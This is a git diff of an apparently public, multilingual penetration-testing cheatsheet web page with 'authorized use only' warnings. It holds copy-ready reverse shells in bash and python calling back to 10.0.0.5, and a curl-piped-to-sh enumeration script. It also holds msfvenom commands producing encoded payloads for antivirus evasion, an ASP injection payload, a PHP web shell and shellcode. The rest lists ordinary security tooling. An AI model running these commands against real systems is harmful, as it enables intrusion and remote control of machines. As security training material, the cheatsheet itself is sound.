+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>check</code></pre>
 
-# exploit (authorized/lab only)
-exploit</code></pre>
-<p class="command-desc" data-i18n="section10CommandDesc"></p>
-</div>
+            <p class="command-desc">exploit (authorized/lab only)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>exploit</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section11Title" data-target="section-11">
+            11) Post-Exploitation: Shells & Enumeration
+            <span class="chip-container"><span class="chip">Shell</span><span class="chip">Privesc</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section11Desc">Listener commands, common reverse shell one-liners, and local privilege escalation helpers.</p>
+        <div id="section-11" class="section-content">
+            <p class="command-desc" data-i18n="section11CommandDesc">Essential commands for establishing and maintaining remote access and internal host reconnaissance.</p>
+            
+            <p class="command-desc"># netcat listener (catch reverse shells)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nc -lvnp 4444</code></pre>
 
-<h2 onclick="toggleSection('s11')"><span data-i18n="section11Title">11) Post-Exploitation: Shells & Enumeration</span><span class="chip-container"><span class="chip" data-tag="shell">Shell</span> <span class="chip" data-tag="privesc">Privesc</span></span></h2>
-<div id="s11">
-<p class="section-desc" data-i18n="section11Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># netcat listener (catch reverse shells)
-nc -lvnp 4444
+            <p class="command-desc">bash reverse shell</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>bash -i >& /dev/tcp/10.0.0.5/4444 0>&1</code></pre>
 
-# bash reverse shell
-bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
+            <p class="command-desc">python reverse shell</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'</code></pre>
 
-# python reverse shell
-python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+            <p class="command-desc">linux enumeration (lab)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh</code></pre>
 
-# linux enumeration (lab)
-curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh
+            <p class="command-desc">windows enumeration</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>.\winpeas.exe</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section12Title" data-target="section-12">
+            12) Network & TLS Checks
+            <span class="chip-container"><span class="chip">Network</span><span class="chip">TLS</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section12Desc">Traffic capture, packet analysis, and SSL/TLS configuration checks.</p>
+        <div id="section-12" class="section-content">
+            <p class="command-desc" data-i18n="section12CommandDesc">Commands for network diagnostics and assessing the cryptographic strength of web endpoints.</p>
+            
+            <p class="command-desc"># tcpdump (capture 1000 packets on eth0)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>tcpdump -i eth0 -w capture.pcap -c 1000</code></pre>
 
-# windows enumeration
-.\winpeas.exe</code></pre>
-<p class="command-desc" data-i18n="section11CommandDesc"></p>
-</div>
+            <p class="command-desc">tshark read (filter HTTP)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri</code></pre>
 
-<h2 onclick="toggleSection('s12')"><span data-i18n="section12Title">12) Network & TLS Checks</span><span class="chip-container"><span class="chip" data-tag="network">Network</span> <span class="chip" data-tag="tls">TLS</span></span></h2>
-<div id="s12">
-<p class="section-desc" data-i18n="section12Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># tcpdump (capture 1000 packets on eth0)
-tcpdump -i eth0 -w capture.pcap -c 1000
+            <p class="command-desc">quick cert info</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>openssl s_client -connect example.com:443 &lt;/dev/null 2&gt;/dev/null | openssl x509 -noout -text</code></pre>
 
-# tshark read (filter HTTP)
-tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri
+            <p class="command-desc">sslyze (comprehensive TLS scan)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>sslyze --regular example.com:443</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section13Title" data-target="section-13">
+            13) Vulnerability Research & PoC Triage
+            <span class="chip-container"><span class="chip">VulnRes</span><span class="chip">PoC</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section13Desc">Searching local exploit databases and safely running proof-of-concept code in isolation.</p>
+        <div id="section-13" class="section-content">
+            <p class="command-desc" data-i18n="section13CommandDesc">Emphasizes local search (searchsploit) and the use of network-isolated containers to prevent lateral movement.</p>
+            
+            <p class="command-desc"># searchsploit</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>searchsploit "CVE-2021-44228"
+searchsploit -m 49993 # copy exploit by EDB ID</code></pre>
 
-# quick cert info
-openssl s_client -connect example.com:443 </dev/null 2>/dev/null | openssl x509 -noout -text
+            <p class="command-desc">fetch PoC (read-only)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>curl -sL "https://raw.githubusercontent.com/user/repo/branch/poc.py" -o /tmp/poc.py</code></pre>
 
-# sslyze (comprehensive TLS scan)
-sslyze --regular example.com:443</code></pre>
-<p class="command-desc" data-i18n="section12CommandDesc"></p>
-</div>
-
-<h2 onclick="toggleSection('s13')"><span data-i18n="section13Title">13) Vulnerability Research & PoC Triage</span><span class="chip-container"><span class="chip" data-tag="vulnres">VulnRes</span> <span class="chip" data-tag="poc">PoC</span></span></h2>
-<div id="s13">
-<p class="section-desc" data-i18n="section13Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># searchsploit
-searchsploit "CVE-2021-44228"
-searchsploit -m 49993  # copy exploit by EDB ID
-
-# fetch PoC (read-only)
-curl -sL "https://raw.githubusercontent.com/user/repo/branch/poc.py" -o /tmp/poc.py
-
-# run PoC inside an isolated, no-network container (safest approach)
-docker run --rm -v /tmp/poc.py:/poc/poc.py --network none -it python:3.10 bash -c "python /poc/poc.py"</code></pre>
-<p class="command-desc" data-i18n="section13CommandDesc"></p>
-</div>
-
-<h2 onclick="toggleSection('s14')"><span data-i18n="section14Title">14) Binary Reversing & Exploit Development</span><span class="chip-container"><span class="chip" data-tag="reversing">Reverse</span> <span class="chip" data-tag="pwn">Pwn</span></span></h2>
-<div id="s14">
-<p class="section-desc" data-i18n="section14Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># ELF inspection
-readelf -h binary
+            <p class="command-desc">run PoC inside an isolated, no-network container (safest approach)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>docker run --rm -v /tmp/poc.py:/poc/poc.py --network none -it python:3.10 bash -c "python /poc/poc.py"</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section14Title" data-target="section-14">
+            14) Binary Reversing & Exploit Development
+            <span class="chip-container"><span class="chip">Reverse</span><span class="chip">Pwn</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section14Desc">Static analysis (ELF), ROP gadget hunting, and interactive debugging setup.</p>
+        <div id="section-14" class="section-content">
+            <p class="command-desc" data-i18n="section14CommandDesc">Tools used for analyzing executable file headers, assembly code, and preparing buffer overflow exploits.</p>
+            
+            <p class="command-desc"># ELF inspection</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>readelf -h binary
 objdump -d binary | less
-strings binary
+strings binary</code></pre>
 
-# radare2
-r2 -AA binary
+            <p class="command-desc">radare2</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>r2 -AA binary</code></pre>
 
-# ropgadget (search for pop/ret gadgets)
-ropgadget --binary binary --only "pop|ret" > gadgets.txt
+            <p class="command-desc">ropgadget (search for pop/ret gadgets)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>ropgadget --binary binary --only "pop|ret" > gadgets.txt</code></pre>
 
-# gdb + pwndbg (start debugging session)
-gdb -q ./binary</code></pre>
-<p class="command-desc" data-i18n="section14CommandDesc"></p>
-</div>
+            <p class="command-desc">gdb + pwndbg (start debugging session)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>gdb -q ./binary</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section15Title" data-target="section-15">
+            15) Fuzzing
+            <span class="chip-container"><span class="chip">Fuzzing</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section15Desc">Instrumented binary fuzzing and HTTP request fuzzing for input discovery.</p>
+        <div id="section-15" class="section-content">
+            <p class="command-desc" data-i18n="section15CommandDesc">AFL is used for finding crashes in C/C++ binaries; Wfuzz is used for black-box web fuzzing.</p>
+            
+            <p class="command-desc"># AFL (instrumented binary)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>afl-fuzz -i in_dir -o out_dir -- ./target @@</code></pre>
 
-<h2 onclick="toggleSection('s15')"><span data-i18n="section15Title">15) Fuzzing</span><span class="chip-container"><span class="chip" data-tag="fuzzing">Fuzzing</span></span></h2>
-<div id="s15">
-<p class="section-desc" data-i18n="section15Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># AFL (instrumented binary)
-afl-fuzz -i in_dir -o out_dir -- ./target @@
+            <p class="command-desc">wfuzz for HTTP (parameter discovery)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>wfuzz -c -z file,/usr/share/wordlists/parameters.txt --hc 404 "https://example.com/vuln?FUZZ=1"</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section16Title" data-target="section-16">
+            16) Mobile & Firmware Analysis
+            <span class="chip-container"><span class="chip">Mobile</span><span class="chip">Firmware</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section16Desc">Decompilation of APKs, dynamic runtime analysis (Frida), and firmware extraction.</p>
+        <div id="section-16" class="section-content">
+            <p class="command-desc" data-i18n="section16CommandDesc">Commands for static and dynamic analysis of Android apps and embedded system binaries.</p>
+            
+            <p class="command-desc"># android decompile / inspect (apktool)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>apktool d app.apk -o app_src</code></pre>
 
-# wfuzz for HTTP (parameter discovery)
-wfuzz -c -z file,/usr/share/wordlists/parameters.txt --hc 404 "https://example.com/vuln?FUZZ=1"</code></pre>
-<p class="command-desc" data-i18n="section15CommandDesc"></p>
-</div>
+            <p class="command-desc">android decompile / inspect (jadx)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>jadx -d out app.apk</code></pre>
 
-<h2 onclick="toggleSection('s16')"><span data-i18n="section16Title">16) Mobile & Firmware Analysis</span><span class="chip-container"><span class="chip" data-tag="mobile">Mobile</span> <span class="chip" data-tag="firmware">Firmware</span></span></h2>
-<div id="s16">
-<p class="section-desc" data-i18n="section16Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># android decompile / inspect (apktool)
-apktool d app.apk -o app_src
+            <p class="command-desc">frida (dynamic hooks) - authorized/lab only</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>frida -U -f com.example.app -l script.js --no-pause</code></pre>
 
-# android decompile / inspect (jadx)
-jadx -d out app.apk
-
-# frida (dynamic hooks) - authorized/lab only
-frida -U -f com.example.app -l script.js --no-pause
-
-# firmware extraction
-binwalk -e firmware.bin
+            <p class="command-desc">firmware extraction</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>binwalk -e firmware.bin
 strings firmware.bin | grep -i password</code></pre>
-<p class="command-desc" data-i18n="section16CommandDesc"></p>
-</div>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section17Title" data-target="section-17">
+            17) Safe PoC Testing & Logging
+            <span class="chip-container"><span class="chip">Safety</span><span class="chip">Logging</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section17Desc">Ensuring safe, reproducible testing environments and comprehensive logging.</p>
+        <div id="section-17" class="section-content">
+            <p class="command-desc" data-i18n="section17CommandDesc">Techniques to minimize risk via Docker isolation and ensure detailed test outcome logging.</p>
+            
+            <p class="command-desc"># isolated container (no external network)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>docker run --rm --network none -v $(pwd):/work -it ubuntu:22.04 bash</code></pre>
 
-<h2 onclick="toggleSection('s17')"><span data-i18n="section17Title">17) Safe PoC Testing & Logging</span><span class="chip-container"><span class="chip" data-tag="safety">Safety</span> <span class="chip" data-tag="logging">Logging</span></span></h2>
-<div id="s17">
-<p class="section-desc" data-i18n="section17Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># isolated container (no external network)
-docker run --rm --network none -v $(pwd):/work -it ubuntu:22.04 bash
+            <p class="command-desc">spin up target service in container (lab)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>docker run --rm -p 8080:80 vuln-app:latest</code></pre>
 
-# spin up target service in container (lab)
-docker run --rm -p 8080:80 vuln-app:latest
+            <p class="command-desc">logging with timestamps & tool version</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>(tool --version 2>&1 ; date; tool [args]) |& tee logfile.txt</code></pre>
 
-# logging with timestamps & tool version
-(tool --version 2>&1 ; date; tool [args]) |& tee logfile.txt
-
-# save JSON where possible
-nuclei -o nuclei.json -oJ nuclei.json
+            <p class="command-desc">save JSON where possible</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nuclei -o nuclei.json -oJ nuclei.json
 ffuf -o ffuf.json -of json</code></pre>
-<p class="command-desc" data-i18n="section17CommandDesc"></p>
+        </div>
+    </div>
+
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section18Title" data-target="section-18">
+            18) Evasion & msfvenom Payloads
+            <span class="chip-container">
+                <span class="chip">Exploit</span>
+                <span class="chip">Evasion</span>
+                <span class="chip">MSF</span>
+            </span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section18Desc">Generating and encoding reverse shell payloads. **AUTHORIZED USE ONLY.**</p>
+        <div id="section-18" class="section-content">
+            <p class="command-desc" data-i18n="section18CommandDesc">Use the '-e' flag for evasion (encoding) and the '-f' flag for different output formats.</p>
+
+            <p class="command-desc">Windows Reverse Shell (Encoded 3 times)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > /root/Desktop/payload-enc.exe</code></pre>
+
+            <p class="command-desc">Linux Python Reverse Shell (Raw Output, useful for injection)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.5 LPORT=4444 -f raw</code></pre>
+
+            <p class="command-desc">Windows ASP Payload for Web Server Injection</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f asp > shell.asp</code></pre>
+            
+            <p class="command-desc">PHP Web Shell for Upload Vulnerabilities</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw > shell.php</code></pre>
+
+            <p class="command-desc">Raw Linux x64 Shellcode (C format)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f c</code></pre>
+        </div>
+    </div>
+
+
+    <footer>
+        <span data-i18n="footerText">Built for learning & defensive security • Use responsibly • Last update: 2025-10-24 • **Andrey Lopukhov, Individual**</span>
+        <span data-i18n="githubLink"> | <a href="https://github.com/tripping-alien/HackersCheatsheet" target="_blank" style="color: var(--accent);">GitHub Repository</a></span>
+    </footer>
+
 </div>
-
-
-<div style="margin:12px 0">
-<button id="toggleAll"></button>
-</div>
-
-<footer>
-    <span data-i18n="footerText"></span>
-    <span data-i18n="githubLink"></span>
-</footer>
-</div>
-
-<script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/prism.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-bash.min.js"></script>
 
 <script>
-// --- I18N (Language Switching) DATA ---
-const translations = {
-  // Main and Global Elements
-  "mainTitle": {
-    "en": "Penetration Testing & Vulnerability Research — Robust Cheatsheet",
-    "ru": "Чит-лист по тестированию на проникновение и исследованию уязвимостей",
-    "he": "גיליון רמאות מקיף לבדיקות חדירה ומחקר פגיעויות",
-    "fr": "Aide-mémoire robuste pour les tests d'intrusion et la recherche de vulnérabilités",
-    "de": "Umfassendes Cheat Sheet für Penetrationstests und Schwachstellenforschung"
-  },
-  "warningTitle": {
-    "en": "⚠️ AUTHORIZED USE ONLY",
-    "ru": "⚠️ ТОЛЬКО ДЛЯ АВТОРИЗОВАННОГО ИСПОЛЬЗОВАНИЯ",
-    "he": "⚠️ שימוש מורשה בלבד",
-    "fr": "⚠️ UTILISATION AUTORISÉE UNIQUEMENT",
-    "de": "⚠️ NUR FÜR AUTORISIERTE NUTZUNG"
-  },
-  "warningBody": {
-    "en": "Run these commands only in lab environments or on targets you have explicit written permission to test.",
-    "ru": "Запускайте эти команды только в лабораторных средах или на целях, для которых у вас есть явное письменное разрешение на тестирование.",
-    "he": "הפעל פקודות אלה רק בסביבות מעבדה או על יעדים שיש לך אישור כתוב מפורש לבדוק.",
-    "fr": "N'exécutez ces commandes que dans des environnements de laboratoire ou sur des cibles pour lesquelles vous disposez d'une autorisation écrite explicite.",
-    "de": "Führen Sie diese Befehle nur in Laborumgebungen oder auf Zielen aus, für die Sie eine ausdrückliche schriftliche Erlaubnis zum Testen haben."
-  },
-  "footerText": {
-    "en": "Built for learning & defensive security • Use responsibly • Last update: 2025-10-24 • **Andrey Lopukhov, Individual**",
-    "ru": "Создано для обучения и защитной безопасности • Используйте ответственно • Последнее обновление: 2025-10-24 • **Андрей Лопухов, Индивидуальный**",
-    "he": "נבנה ללמידה ואבטחה הגנתית • השתמשו באחריות • עדכון אחרון: 2025-10-24 • **אנדריי לופוחוב, יחיד**",
-    "fr": "Conçu pour l'apprentissage et la sécurité défensive • Utiliser de manière responsable • Dernière mise à jour: 2025-10-24 • **Andrey Lopukhov, Individual**",
-    "de": "Erstellt für Lern- und Verteidigungszwecke • Verantwortungsbewusst nutzen • Letzte Aktualisierung: 2025-10-24 • **Andrey Lopukhov, Individual**"
-  },
-  "githubLink": {
-    "en": " | <a href=\"https://github.com/tripping-alien/HackersCheatsheet\" target=\"_blank\" style=\"color: var(--accent);\">GitHub Repository</a>",
-    "ru": " | <a href=\"https://github.com/tripping-alien/HackersCheatsheet\" target=\"_blank\" style=\"color: var(--accent);\">Репозиторий GitHub</a>",
-    "he": " | <a href=\"https://github.com/tripping-alien/HackersCheatsheet\" target=\"_blank\" style=\"color: var(--accent);\">מאגר GitHub</a>",
-    "fr": " | <a href=\"https://github.com/tripping-alien/HackersCheatsheet\" target=\"_blank\" style=\"color: var(--accent);\">Répertoire GitHub</a>",
-    "de": " | <a href=\"https://github.com/tripping-alien/HackersCheatsheet\" target=\"_blank\" style=\"color: var(--accent);\">GitHub-Repository</a>"
-  },
-  "searchInputPlaceholder": {
-    "en": "Search commands, tools, CVE...",
-    "ru": "Поиск команд, инструментов, CVE...",
-    "he": "חפש פקודות, כלים, CVE...",
-    "fr": "Rechercher commandes, outils, CVE...",
-    "de": "Suche Befehle, Tools, CVE..."
-  },
-  "toggleButtonCollapsed": {
-    "en": "Expand All",
-    "ru": "Развернуть все",
-    "he": "הרחב הכל",
-    "fr": "Tout développer",
-    "de": "Alle erweitern"
-  },
-  "toggleButtonExpanded": {
-    "en": "Collapse All",
-    "ru": "Свернуть все",
-    "he": "כווץ הכל",
-    "fr": "Tout réduire",
-    "de": "Alle zuklappen"
-  },
-  
-  // SECTION 1: Recon & OSINT
-  "section1Title": {"en": "1) Recon & OSINT", "ru": "1) Разведка и OSINT", "he": "1) סיור ואיסוף מודיעין גלוי", "fr": "1) Reconnaissance et OSINT", "de": "1) Aufklärung & OSINT"},
-  "section1Desc": {"en": "Footprinting, WHOIS, DNS lookups, and passive certificate data gathering.", "ru": "Сбор следов, запросы WHOIS, поиск DNS и пассивный сбор данных сертификатов.", "he": "איסוף טביעת רגל, בדיקות WHOIS, חיפושי DNS ואיסוף פסיבי של נתוני תעודות SSL.", "fr": "Empreinte, recherches WHOIS, DNS et collecte passive de données de certificat.", "de": "Footprinting, WHOIS, DNS-Abfragen und passive Zertifikatdatenerfassung."},
-  "section1CommandDesc": {"en": "Commands gather domain info, DNS records, HTTP headers, and passive certificate/host data.", "ru": "Команды собирают информацию о домене, DNS-записи, заголовки HTTP и пассивные данные сертификатов/хостов.", "he": "פקודות לאיסוף פרטי דומיין, רשומות DNS, כותרות HTTP ונתוני אישור/מארח פסיביים.", "fr": "Les commandes recueillent des informations de domaine, des enregistrements DNS, des en-têtes HTTP et des données passives de certificat/hôte.", "de": "Befehle erfassen Domäneninformationen, DNS-Einträge, HTTP-Header und passive Zertifikats-/Hostdaten."},
+    // --- I18N (Language Switching) DATA ---
+    const translations = {
+        // Main and Global Elements
+        "mainTitle": { "en": "Penetration Testing & Vulnerability Research — Robust Cheatsheet", "ru": "Чит-лист по тестированию на проникновение и исследованию уязвимостей", "he": "גיליון רמאות מקיף לבדיקות חדירה ומחקר פגיעויות", "fr": "Aide-mémoire robuste pour les tests d'intrusion et la recherche de vulnérabilités", "de": "Umfassendes Cheat Sheet für Penetrationstests und Schwachstellenforschung" },
+        "warningTitle": { "en": "⚠️ AUTHORIZED USE ONLY", "ru": "⚠️ ТОЛЬКО ДЛЯ АВТОРИЗОВАННОГО ИСПОЛЬЗОВАНИЯ", "he": "⚠️ שימוש מורשה בלבד", "fr": "⚠️ UTILISATION AUTORISÉE UNIQUEMENT", "de": "⚠️ NUR FÜR AUTORISIERTE NUTZUNG" },
+        "warningBody": { "en": "Run these commands only in lab environments or on targets you have explicit written permission to test.", "ru": "Запускайте эти команды только в лабораторных средах или на целях, для которых у вас есть явное письменное разрешение на тестирование.", "he": "הפעל פקודות אלה רק בסביבות מעבדה או על יעדים שיש לך אישור כתוב מפורש לבדוק.", "fr": "N'exécutez ces commandes que dans des environnements de laboratoire ou sur des cibles pour lesquelles vous disposez d'une autorisation écrite explicite.", "de": "Führen Sie diese Befehle nur in Laborumgebungen oder auf Zielen aus, für die Sie eine ausdrückliche schriftliche Erlaubnis zum Testen haben." },
+        "footerText": { "en": "Built for learning & defensive security • Use responsibly • Last update: 2025-10-24 • **Andrey Lopukhov, Individual**", "ru": "Создано для обучения и защитной безопасности • Используйте ответственно • Последнее обновление: 2025-10-24 • **Андрей Лопухов, Индивидуальный**", "he": "נבנה ללמידה ואבטחה הגנתית • השתמשו באחריות • עדכון אחרון: 2025-10-24 • **אנדריי לופוחוב, יחיד**", "fr": "Conçu pour l'apprentissage et la sécurité défensive • Utiliser de manière responsable • Dernière mise à jour: 2025-10-24 • **Andrey Lopukhov, Individual**", "de": "Erstellt für Lern- und Verteidigungszwecken • Verantwortungsbewusst nutzen • Letzte Aktualisierung: 2025-10-24 • **Andrey Lopukhov, Individual**" },
+        "githubLink": { "en": " | <a href=\"https://github.com/tripping-alien/HackersCheatsheet\" target=\"_blank\" style=\"color: var(--accent);\">GitHub Repository</a>", "ru": " | <a href=\"https://github.com/tripping-alien/HackersCheatsheet\" target=\"_blank\" style=\"color: var(--accent);\">Репозиторий GitHub</a>", "he": " | <a href=\"https://github.com/tripping-alien/HackersCheatsheet\" target=\"_blank\" style=\"color: var(--accent);\">מאגר GitHub</a>", "fr": " | <a href=\"https://github.com/tripping-alien/HackersCheatsheet\" target=\"_blank\" style=\"color: var(--accent);\">Répertoire GitHub</a>", "de": " | <a href=\"https://github.com/tripping-alien/HackersCheatsheet\" target=\"_blank\" style=\"color: var(--accent);\">GitHub-Repository</a>" },
+        "searchInputPlaceholder": { "en": "Search commands, tools, CVE...", "ru": "Поиск команд, инструментов, CVE...", "he": "חפש פקודות, כלים, CVE...", "fr": "Rechercher commandes, outils, CVE...", "de": "Suche Befehle, Tools, CVE..." },
+        "toggleButtonCollapsed": { "en": "Expand All", "ru": "Развернуть все", "he": "הרחב הכל", "fr": "Tout développer", "de": "Alle erweitern" },
+        "toggleButtonExpanded": { "en": "Collapse All", "ru": "Свернуть все", "he": "כווץ הכל", "fr": "Tout réduire", "de": "Alle zuklappen" },
+        "copyButtonText": { "en": "Copy", "ru": "Копировать", "he": "העתק", "fr": "Copier", "de": "Kopieren" },
 
-  // SECTION 2: Recon: Search Engine Dorking & Exposed Assets
-  "section2Title": {"en": "2) Recon: Search Engine Dorking & Exposed Assets", "ru": "2) Разведка: Доркинг поисковых систем и открытые активы", "he": "2) סיור: דורקינג מנועי חיפוש ונכסים חשופים", "fr": "2) Dorking et Actifs Exposés", "de": "2) Suchmaschinen-Dorking & Exposed Assets"},
-  "section2Desc": {"en": "Using advanced search operators (Dorks) on Google, Bing, and Yandex to discover exposed files, directories, and misconfigurations.", "ru": "Использование расширенных операторов поиска (Дорков) для обнаружения открытых файлов, каталогов и неверных конфигураций.", "he": "שימוש באופרטורי חיפוש מתקדמים (דורקים) לגילוי קבצים, ספריות ותצורות שגויות שנחשפו.", "fr": "Utilisation d'opérateurs de recherche avancés (Dorks) pour découvrir des fichiers, répertoires et erreurs de configuration exposés.", "de": "Verwendung erweiterter Suchoperatoren (Dorks) zur Entdeckung exponierter Dateien, Verzeichnisse und Fehlkonfigurationen."},
-  "section2CommandDesc": {"en": "These dorks work across all major search engines and are crucial for external reconnaissance.", "ru": "Эти дорки работают во всех основных поисковых системах и критически важны для внешней разведки.", "he": "דורקים אלו עובדים בכל מנועי החיפוש העיקריים והם חיוניים לסיור חיצוני.", "fr": "Ces dorks fonctionnent sur tous les principaux moteurs de recherche et sont cruciaux pour la reconnaissance externe.", "de": "Diese Dorks funktionieren auf allen gängigen Suchmaschinen und sind entscheidend für die externe Aufklärung."},
-  
-  // SECTION 3: SEO & Indexation Security
-  "section3Title": {"en": "3) SEO & Indexation Security", "ru": "3) Безопасность SEO и индексации", "he": "3) אבטחת SEO ואינדוקס", "fr": "3) Sécurité SEO et Indexation", "de": "3) SEO- & Indexierungssicherheit"},
-  "section3Desc": {"en": "Testing for misconfigurations in robots.txt, meta tags, and canonical URLs that lead to unintended data exposure or duplicate content issues.", "ru": "Проверка на неверные конфигурации в robots.txt, мета-тегах и канонических URL-адресах, которые могут привести к непреднамеренному раскрытию данных.", "he": "בדיקת תצורות שגויות ב-robots.txt, תגי מטא וכתובות URL קנוניות שעלולות להוביל לחשיפת נתונים לא מכוונת.", "fr": "Test des erreurs de configuration dans robots.txt, les balises meta et les URL canoniques qui entraînent une exposition involontaire des données.", "de": "Überprüfung auf Fehlkonfigurationen in robots.txt, Meta-Tags und kanonischen URLs, die zu unbeabsichtigter Datenexposition führen."},
-  "section3CommandDesc": {"en": "These checks help find security issues caused by poor communication between developers and search engine crawlers.", "ru": "Эти проверки помогают выявить проблемы безопасности, вызванные плохой коммуникацией между разработчиками и поисковыми роботами.", "he": "בדיקות אלו מסייעות במציאת בעיות אבטחה שנגרמות מתקשורת לקויה בין מפתחים לסורקי מנועי חיפוש.", "fr": "Ces vérifications aident à trouver des problèmes de sécurité causés par une mauvaise communication entre les développeurs et les robots des moteurs de recherche.", "de": "Diese Prüfungen helfen, Sicherheitsprobleme zu finden, die durch schlechte Kommunikation zwischen Entwicklern und Suchmaschinen-Crawlern verursacht werden."},
+        // SECTION 1: Recon & OSINT
+        "section1Title": {"en": "1) Recon & OSINT", "ru": "1) Разведка и OSINT", "he": "1) סיור ואיסוף מודיעין גלוי", "fr": "1) Reconnaissance et OSINT", "de": "1) Aufklärung & OSINT"},
+        "section1Desc": {"en": "Footprinting, WHOIS, DNS lookups, and passive certificate data gathering.", "ru": "Сбор следов, запросы WHOIS, поиск DNS и пассивный сбор данных сертификатов.", "he": "איסוף טביעת רגל, בדיקות WHOIS, חיפושי DNS ואיסוף פסיבי של נתוני תעודות SSL.", "fr": "Empreinte, recherches WHOIS, DNS et collecte passive de données de certificat.", "de": "Footprinting, WHOIS, DNS-Abfragen und passive Zertifikatdatenerfassung."},
